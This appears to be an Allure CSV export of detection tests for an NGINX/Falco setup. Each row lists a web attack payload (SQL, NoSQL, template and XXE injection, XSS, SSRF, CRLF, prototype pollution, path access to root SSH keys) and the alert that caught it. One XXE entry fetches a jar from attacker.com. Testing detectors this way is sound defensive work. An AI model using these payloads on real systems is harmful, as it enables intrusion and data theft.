"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_003` |
| **Name** | Root SSH authorized keys access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/root/.ssh/authorized_keys`
- **Encoded**: `/root/.ssh/authorized_keys`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~101000ms
- **Timestamp**: 11:10:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_003-1772277018430-4onxwo pattern_id=PATH_ABS_003 uri=/?q=/root/.ssh/authorized_keys client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_003-1772277018430-4onxwo pattern_id=PATH_ABS_003 uri=/?q=/root/.ssh/authorized_keys client=127.0.0.1

**Falco Log Entry**:
```
11:10:18.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_003-1772277018430-4onxwo pattern_id=PATH_ABS_003 uri=/?q=/root/.ssh/authorized_keys client=127.0.0.1
```","2","test_e2e_with_logs[231_PATH_ABS_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_MONGO_006` |
| **Name** | MongoDB $or Authentication Bypass |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | mongodb |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""$or"": [{""username"": ""admin""}, {""username"": ""root""}]}`
- **Encoded**: `%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 11:10:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_006-1772277057428-s4lrvo pattern_id=NOSQL_MONGO_006 uri=/?q=%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_006-1772277057428-s4lrvo pattern_id=NOSQL_MONGO_006 uri=/?q=%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D client=127.0.0.1

**Falco Log Entry**:
```
11:10:57.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_006-1772277057428-s4lrvo pattern_id=NOSQL_MONGO_006 uri=/?q=%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D client=127.0.0.1
```","2","test_e2e_with_logs[709_NOSQL_MONGO_006]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_INT_006` |
| **Name** | Kubernetes Kubelet API Access |
| **Category** | SSRF |
| **Subcategory** | internal_service |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `http://localhost:10250/pods`
- **Encoded**: `http%3A%2F%2Flocalhost%3A10250%2Fpods`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 11:11:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_006-1772277085436-3bv34k pattern_id=SSRF_INT_006 uri=/?q=http%3A%2F%2Flocalhost%3A10250%2Fpods client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_006-1772277085436-3bv34k pattern_id=SSRF_INT_006 uri=/?q=http%3A%2F%2Flocalhost%3A10250%2Fpods client=127.0.0.1

**Falco Log Entry**:
```
11:11:25.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_006-1772277085436-3bv34k pattern_id=SSRF_INT_006 uri=/?q=http%3A%2F%2Flocalhost%3A10250%2Fpods client=127.0.0.1
```","2","test_e2e_with_logs[646_SSRF_INT_006]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_008` |
| **Name** | Template literal polyglot |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{alert('XSS')}`
- **Encoded**: `%7Balert%28%27XSS%27%29%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~80000ms
- **Timestamp**: 11:10:39.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_POLY_008-1772277039488-6gbh8d pattern_id=XSS_POLY_008 uri=/?q=%7Balert%28%27XSS%27%29%7D client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_POLY_008-1772277039488-6gbh8d pattern_id=XSS_POLY_008 uri=/?q=%7Balert%28%27XSS%27%29%7D client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:10:39.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_POLY_008-1772277039488-6gbh8d pattern_id=XSS_POLY_008 uri=/?q=%7Balert%28%27XSS%27%29%7D client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[203_XSS_POLY_008]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_XML_001` |
| **Name** | Oracle XMLTYPE Injection |
| **Category** | SQLI |
| **Subcategory** | xml_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' AND EXTRACTVALUE(XMLTYPE('<a>'||(SELECT user FROM dual)||'</a>'),'/a')='test'--`
- **Encoded**: `'%20AND%20EXTRACTVALUE(XMLTYPE('%3Ca%3E'%7C%7C(SELECT%20user%20FROM%20dual)%7C%7C'%3C%2Fa%3E')%2C'%2Fa')%3D'test'--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 11:11:00.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_XML_001-1772277060046-6xh3q pattern_id=SQLI_XML_001 uri=/?q='%20AND%20EXTRACTVALUE(XMLTYPE('%3Ca%3E'%7C%7C(SELECT%20user%20FROM%20dual)%7C%7C'%3C%2Fa%3E')%2C'%2Fa')%3D'test'-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_XML_001-1772277060046-6xh3q pattern_id=SQLI_XML_001 uri=/?q='%20AND%20EXTRACTVALUE(XMLTYPE('%3Ca%3E'%7C%7C(SELECT%20user%20FROM%20dual)%7C%7C'%3C%2Fa%3E')%2C'%2Fa')%3D'test'-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:11:00.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_XML_001-1772277060046-6xh3q pattern_id=SQLI_XML_001 uri=/?q='%20AND%20EXTRACTVALUE(XMLTYPE('%3Ca%3E'%7C%7C(SELECT%20user%20FROM%20dual)%7C%7C'%3C%2Fa%3E')%2C'%2Fa')%3D'test'-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[134_SQLI_XML_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_JAR_001` |
| **Name** | XXE JAR protocol remote code execution |
| **Category** | XXE |
| **Subcategory** | protocol_abuse |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""jar:http://attacker.com/evil.jar!/"">`
- **Encoded**: `%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~87000ms
- **Timestamp**: 11:10:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1772277032916-ghh6hs pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1772277032916-ghh6hs pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1

**Falco Log Entry**:
```
11:10:32.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1772277032916-ghh6hs pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[657_XXE_JAR_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_UTF8_001` |
| **Name** | UTF-8 encoded CRLF injection |
| **Category** | CRLF |
| **Subcategory** | utf8_crlf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%E5%98%8A%E5%98%8Dinjected-header:evil`
- **Encoded**: `%E5%98%8A%E5%98%8Dinjected-header%3Aevil`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~27000ms
- **Timestamp**: 11:11:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_UTF8_001-1772277092439-6veihn pattern_id=CRLF_UTF8_001 uri=/?q=%E5%98%8A%E5%98%8Dinjected-header%3Aevil client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_UTF8_001-1772277092439-6veihn pattern_id=CRLF_UTF8_001 uri=/?q=%E5%98%8A%E5%98%8Dinjected-header%3Aevil client=127.0.0.1

**Falco Log Entry**:
```
11:11:32.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_UTF8_001-1772277092439-6veihn pattern_id=CRLF_UTF8_001 uri=/?q=%E5%98%8A%E5%98%8Dinjected-header%3Aevil client=127.0.0.1
```","2","test_e2e_with_logs[832_CRLF_UTF8_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_EJS_002` |
| **Name** | EJS prototype chain exploitation |
| **Category** | SSTI |
| **Subcategory** | ejs |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<%-global.process.mainModule.require('child_process')%>`
- **Encoded**: `%3C%25-global.process.mainModule.require%28%27child_process%27%29%25%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 11:10:58.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSTI] Server-Side Template Injection detected` |
| **Matched Rule** | `[NGINX SSTI] Server-Side Template Injection detected test_id=SSTI_EJS_002-1772277058940-je4t9 pattern_id=SSTI_EJS_002 uri=/?q=%3C%25-global.process.mainModule.require%28%27child_process%27%29%25%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSTI] Server-Side Template Injection detected test_id=SSTI_EJS_002-1772277058940-je4t9 pattern_id=SSTI_EJS_002 uri=/?q=%3C%25-global.process.mainModule.require%28%27child_process%27%29%25%3E client=127.0.0.1

**Falco Log Entry**:
```
11:10:58.000000000: Critical [NGINX SSTI] Server-Side Template Injection detected test_id=SSTI_EJS_002-1772277058940-je4t9 pattern_id=SSTI_EJS_002 uri=/?q=%3C%25-global.process.mainModule.require%28%27child_process%27%29%25%3E client=127.0.0.1
```","2","test_e2e_with_logs[565_SSTI_EJS_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `REDIR_BYPASS_002` |
| **Name** | Whitelist bypass via backslash @ |
| **Category** | OPEN_REDIRECT |
| **Subcategory** | whitelist_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `redirect=https://good.com\@evil.com`
- **Encoded**: `redirect%3Dhttps%3A%2F%2Fgood.com%5C%40evil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~21000ms
- **Timestamp**: 11:11:38.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Redirect] Open redirect attempt detected` |
| **Matched Rule** | `[NGINX Redirect] Open redirect attempt detected test_id=REDIR_BYPASS_002-1772277098418-websbc pattern_id=REDIR_BYPASS_002 uri=/?q=redirect%3Dhttps%3A%2F%2Fgood.com%5C%40evil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Redirect] Open redirect attempt detected test_id=REDIR_BYPASS_002-1772277098418-websbc pattern_id=REDIR_BYPASS_002 uri=/?q=redirect%3Dhttps%3A%2F%2Fgood.com%5C%40evil.com client=127.0.0.1

**Falco Log Entry**:
```
11:11:38.000000000: Warning [NGINX Redirect] Open redirect attempt detected test_id=REDIR_BYPASS_002-1772277098418-websbc pattern_id=REDIR_BYPASS_002 uri=/?q=redirect%3Dhttps%3A%2F%2Fgood.com%5C%40evil.com client=127.0.0.1
```","2","test_e2e_with_logs[470_REDIR_BYPASS_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_010` |
| **Name** | Meta refresh redirect |
| **Category** | XSS |
| **Subcategory** | bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>`
- **Encoded**: `%3Cmeta%20http-equiv%3D'refresh'%20content%3D'0%3Burl%3Djavascript%3Aalert(1)'%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~93000ms
- **Timestamp**: 11:10:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_010-1772277026959-qsfftc pattern_id=XSS_BYPASS_010 uri=/?q=%3Cmeta%20http-equiv%3D'refresh'%20content%3D'0%3Burl%3Djavascript%3Aalert(1)'%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_010-1772277026959-qsfftc pattern_id=XSS_BYPASS_010 uri=/?q=%3Cmeta%20http-equiv%3D'refresh'%20content%3D'0%3Burl%3Djavascript%3Aalert(1)'%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:10:26.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_010-1772277026959-qsfftc pattern_id=XSS_BYPASS_010 uri=/?q=%3Cmeta%20http-equiv%3D'refresh'%20content%3D'0%3Burl%3Djavascript%3Aalert(1)'%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[157_XSS_BYPASS_010]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_JINJA_003` |
| **Name** | Jinja2 Lipsum Function Injection |
| **Category** | SSTI |
| **Subcategory** | jinja2 |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{{lipsum(1)}}`
- **Encoded**: `%7B%7Blipsum(1)%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~74000ms
- **Timestamp**: 11:10:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_003-1772277045910-belcli pattern_id=SSTI_JINJA_003 uri=/?q=%7B%7Blipsum(1)%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_003-1772277045910-belcli pattern_id=SSTI_JINJA_003 uri=/?q=%7B%7Blipsum(1)%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
11:10:45.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_003-1772277045910-belcli pattern_id=SSTI_JINJA_003 uri=/?q=%7B%7Blipsum(1)%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[660_SSTI_JINJA_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PICKLE_DESER_005` |
| **Name** | __reduce__ Method with Module Context |
| **Category** | PICKLE |
| **Subcategory** | deserialization |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `module.__reduce__`
- **Encoded**: `module.__reduce__`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~58000ms
- **Timestamp**: 11:11:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Deserialization attack` |
| **Matched Rule** | `[NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_005-1772277061912-ucuutu pattern_id=PICKLE_DESER_005 uri=/?q=module.__reduce__ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_005-1772277061912-ucuutu pattern_id=PICKLE_DESER_005 uri=/?q=module.__reduce__ client=127.0.0.1

**Falco Log Entry**:
```
11:11:01.000000000: Critical [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_005-1772277061912-ucuutu pattern_id=PICKLE_DESER_005 uri=/?q=module.__reduce__ client=127.0.0.1
```","2","test_e2e_with_logs[534_PICKLE_DESER_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `GQL_DATA_005` |
| **Name** | GraphQL raw first keyword mass extraction |
| **Category** | GRAPHQL |
| **Subcategory** | data_extraction |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `first:9999`
- **Encoded**: `first:9999`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~78000ms
- **Timestamp**: 11:10:41.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX GraphQL Attack] Mass data extraction attempt` |
| **Matched Rule** | `[NGINX GraphQL Attack] Mass data extraction attempt test_id=GQL_DATA_005-1772277041426-y6peb pattern_id=GQL_DATA_005 uri=/?q=first:9999 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX GraphQL Attack] Mass data extraction attempt test_id=GQL_DATA_005-1772277041426-y6peb pattern_id=GQL_DATA_005 uri=/?q=first:9999 client=127.0.0.1

**Falco Log Entry**:
```
11:10:41.000000000: Warning [NGINX GraphQL Attack] Mass data extraction attempt test_id=GQL_DATA_005-1772277041426-y6peb pattern_id=GQL_DATA_005 uri=/?q=first:9999 client=127.0.0.1
```","2","test_e2e_with_logs[523_GQL_DATA_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_005` |
| **Name** | Hex encoded whoami command |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `\x77\x68\x6f\x61\x6d\x69`
- **Encoded**: `%5Cx77%5Cx68%5Cx6f%5Cx61%5Cx6d%5Cx69`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[358_CMD_ENC_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PP_NESTED_002` |
| **Name** | Deep Nested __proto__ |
| **Category** | PROTOTYPE_POLLUTION |
| **Subcategory** | nested |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `?obj[__proto__][__proto__][polluted]=true`
- **Encoded**: `%3Fobj%5B__proto__%5D%5B__proto__%5D%5Bpolluted%5D%3Dtrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 11:11:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX PP] Prototype pollution attack attempt` |
| **Matched Rule** | `[NGINX PP] Prototype pollution attack attempt test_id=PP_NESTED_002-1772277067915-txhij2 pattern_id=PP_NESTED_002 uri=/?q=%3Fobj%5B__proto__%5D%5B__proto__%5D%5Bpolluted%5D%3Dtrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX PP] Prototype pollution attack attempt test_id=PP_NESTED_002-1772277067915-txhij2 pattern_id=PP_NESTED_002 uri=/?q=%3Fobj%5B__proto__%5D%5B__proto__%5D%5Bpolluted%5D%3Dtrue client=127.0.0.1

**Falco Log Entry**:
```
11:11:07.000000000: Warning [NGINX PP] Prototype pollution attack attempt test_id=PP_NESTED_002-1772277067915-txhij2 pattern_id=PP_NESTED_002 uri=/?q=%3Fobj%5B__proto__%5D%5B__proto__%5D%5Bpolluted%5D%3Dtrue client=127.0.0.1
```","2","test_e2e_with_logs[720_PP_NESTED_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_STACK_004` |
| **Name** | Backdoor table creation attempt |
| **Category** | SQLI |
| **Subcategory** | stacked_queries |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; CREATE TABLE backdoor (id INT, cmd VARCHAR(255)); --`
- **Encoded**: `%27%3B%20CREATE%20TABLE%20backdoor%20%28id%20INT%2C%20cmd%20VARCHAR%28255%29%29%3B%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~93000ms
- **Timestamp**: 11:10:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_004-1772277026974-kz0y89 pattern_id=SQLI_STACK_004 uri=/?q=%27%3B%20CREATE%20TABLE%20backdoor%20%28id%20INT%2C%20cmd%20VARCHAR%28255%29%29%3B%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_004-1772277026974-kz0y89 pattern_id=SQLI_STACK_004 uri=/?q=%27%3B%20CREATE%20TABLE%20backdoor%20%28id%20INT%2C%20cmd%20VARCHAR%28255%29%29%3B%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:10:26.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_004-1772277026974-kz0y89 pattern_id=SQLI_STACK_004 uri=/?q=%27%3B%20CREATE%20TABLE%20backdoor%20%28id%20INT%2C%20cmd%20VARCHAR%28255%29%29%3B%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[102_SQLI_STACK_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
